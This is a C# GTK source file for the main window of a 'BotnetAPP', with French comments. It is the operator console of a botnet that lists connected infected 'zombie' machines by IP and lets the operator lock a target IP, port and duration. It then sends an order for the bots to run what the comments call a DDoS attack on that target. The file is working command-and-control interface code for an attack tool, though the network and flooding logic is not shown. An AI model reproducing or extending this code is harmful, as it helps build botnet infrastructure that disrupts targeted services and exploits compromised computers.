using System;
using Gtk;
using System.Threading;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using BotnetAPP.Network;
using BotnetAPP.Data ; 

using BotnetAPP.Shared;
using System.Timers;

namespace BotnetAPP.UI
{
    public class MainWindow : Window
    {
        private Boolean IsLockedTarget = false;

        private Notebook notebook;
        private VBox _mainBox;

        private Network.Connection _Net ;




        enum Column
        {
            IP,
            ACTION,
            GIVINGORDER,
        }


        private ListStore ListStore ; 

        private Statusbar _statusbar;
        private TreeView treeView;
        private VBox ZombiePage;
        private VBox DashboardPage;

        private Data.Connection db = new Data.Connection() ;




        public MainWindow() : base("BotnetApp - Main")
        {

            SetDefaultSize(500, 500);
            SetPosition(WindowPosition.Center);
            //BorderWidth = 20;
            DeleteEvent += delegate { Application.Quit(); };
            Resizable = false;


            _Net = new Network.Connection() ;

 

            /**
            * PAGE PERMETTANT D'AFFICHER LES INFORMATIONS GÉNÉRALE DE L'ETAT ACTUEL
            **/
            DashboardPage = new VBox();

            DashboardPage.PackStart(new Label("Ici c'est le dashboard"), true, false, 2);




            /**
            * PAGE PERMETTANT LE LANCEMENT D'UNE ATTAQUE DDOS GRÂCE AUX PC INFECTÉ 
            * LA CIBLE DOIT ÊTRE CONFIGURER SUR LA PAGE 
            **/



            ZombiePage = new VBox();

            ScrolledWindow sw = new ScrolledWindow();
            sw.ShadowType = ShadowType.EtchedIn;
            sw.SetPolicy(PolicyType.Automatic, PolicyType.Automatic);

            Button AttackButton = new Button("Il faut aller configurer l'attaque")
            {
                Sensitive = false
            };

   

            treeView = new TreeView();
            CellRenderer rendererText = new CellRendererText();

            //treeView.AppendColumn("ORDER", new CellRendererToggle() { Active = true });
            treeView.AppendColumn("IP", new CellRendererText(), "text", 0);
            treeView.AppendColumn("ACTION", new CellRendererText(), "text", 1);

            ListStore = new ListStore(typeof(string), typeof(string));


            treeView.Model = ListStore;

            /*
            Dans le cas ou il y'a une nouvelle connexion ou une deconnexion 
            on doit refresh complétement le menu
            */
            _Net.NewConnectedBot += RefreshBoard ;
            _Net.NewDisconnectionBot += RefreshBoard ; 

            sw.Add(treeView);

            ZombiePage.PackStart(sw, true, true, 0);
            ZombiePage.PackEnd(AttackButton, false, true, 0);

            /**
                PAGE DE PARAMÈTRE 
                PERMET DE CONFIGURER L'ATTAQUE
            **/

            VBox SettingPage = new VBox();

            SettingPage.BorderWidth = 20;

            Label TargetIPLibelle = new Label("IP Visé");
            Entry TargetIPEntry = new Entry() { PlaceholderText = "IP Visé" };

            Label DurationAttackTitle = new Label("Durée de l'attaque");
            SpinButton DurationAttackSetting = new SpinButton(0, 1440, 5);

            Label LabelPortLibelle = new Label("Port Visé");
            SpinButton PortAttackSetting = new SpinButton(1024, 49151, 1);


            Button VerrouillerCibleBouton = new Button("Valider");


            SettingPage.PackStart(DurationAttackTitle, false, false, 10);
            SettingPage.PackStart(DurationAttackSetting, false, true, 10);


            SettingPage.PackStart(TargetIPLibelle, false, false, 10);
            SettingPage.PackStart(TargetIPEntry, false, false, 10);

            SettingPage.PackStart(LabelPortLibelle, false, false, 10);
            SettingPage.PackStart(PortAttackSetting, false, false, 10);


            SettingPage.PackEnd(VerrouillerCibleBouton, false, false, 0);

            VerrouillerCibleBouton.Clicked += delegate
            {

                if (IsLockedTarget)
                {
                    IsLockedTarget = false;

                    AttackButton.Sensitive = false;
                    AttackButton.Label = "Veuillez configurer l'attaque";

                    VerrouillerCibleBouton.Label = "Valider la cible" ;
                    VerrouillerCibleBouton.Sensitive = true;


                    // On réactive les boutons                     
                    DurationAttackSetting.Sensitive = true;
                    TargetIPEntry.Sensitive = true;
                    PortAttackSetting.Sensitive = true;

                }
                else
                {
                    if (IPAddress.TryParse(TargetIPEntry.Text, out IPAddress IPValide))
                    {
                        if (PortAttackSetting.ValueAsInt >= 1024 && PortAttackSetting.ValueAsInt <= 49151)
                        {
                            if (DurationAttackSetting.ValueAsInt >= 1 && DurationAttackSetting.ValueAsInt <= 1440)
                            {
                                IsLockedTarget = true;

                                // ON désactive les boutons
                                DurationAttackSetting.Sensitive = false;
                                TargetIPEntry.Sensitive = false;
                                PortAttackSetting.Sensitive = false;

                                AttackButton.Sensitive = true;
                                AttackButton.Label = "Attaquer la cible verrouiller";

                                VerrouillerCibleBouton.Label = "Changer de cible" ; 
                            }
                            else
                            {
                                MessageDialog md = new MessageDialog(this, DialogFlags.DestroyWithParent, MessageType.Error, ButtonsType.Close, "Durée non valide");
                                md.Run();
                                md.Destroy();
                            }
                        }
                        else
                        {
                            MessageDialog md = new MessageDialog(this, DialogFlags.DestroyWithParent, MessageType.Error, ButtonsType.Close, "Port non valide");
                            md.Run();
                            md.Destroy();
                        }
                    }
                    else
                    {
                        MessageDialog md = new MessageDialog(this, DialogFlags.DestroyWithParent, MessageType.Error, ButtonsType.Close, "Adresse IP non valide");
                        md.Run();
                        md.Destroy();
                    }
                }
            };

            _Net.EndAttack += delegate {
                 AttackButton.Sensitive = true ;
                VerrouillerCibleBouton.Sensitive = true ;
            } ; 
            

            /*
            delegate {
                Console.WriteLine("On passe ici") ; 

                AttackButton.Sensitive = true ;
                VerrouillerCibleBouton.Sensitive = true ;
            };
            */



            /**
            PAGE PRINCIPALE
            **/



            _mainBox = new VBox();

            notebook = new Notebook();
            notebook.ShowTabs = true;

            notebook.AppendPage(DashboardPage, new Label("Dashboard"));
            notebook.AppendPage(ZombiePage, new Label("Attaque"));
            notebook.AppendPage(new Frame(), new Label("History"));
            notebook.AppendPage(SettingPage, new Label("Setting"));
            notebook.AppendPage(new Frame(), new Label("About"));


            _mainBox.PackEnd(notebook, true, true, 0);


            Add(_mainBox);

            AttackButton.Clicked += delegate {

                /*
                Lorsqu'une attaque vient d'être lancée 
                on désactive tout les boutons
                */

                AttackButton.Sensitive = false ;
                VerrouillerCibleBouton.Sensitive = false ;


                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt  )) ;

            
            } ;


            ShowAll();
        }





        private void RefreshBoard(object sender) {

            ListStore.Clear() ;

            Dictionary<Zombie, System.Net.Sockets.Socket> connectedUser = _Net.GetConnectedBot ;

            foreach ( KeyValuePair<Zombie, System.Net.Sockets.Socket> item in connectedUser)  {
                ListStore.AppendValues(item.Value.RemoteEndPoint.ToString(), item.Key.GetAction ) ; 
            }
        }
    }
}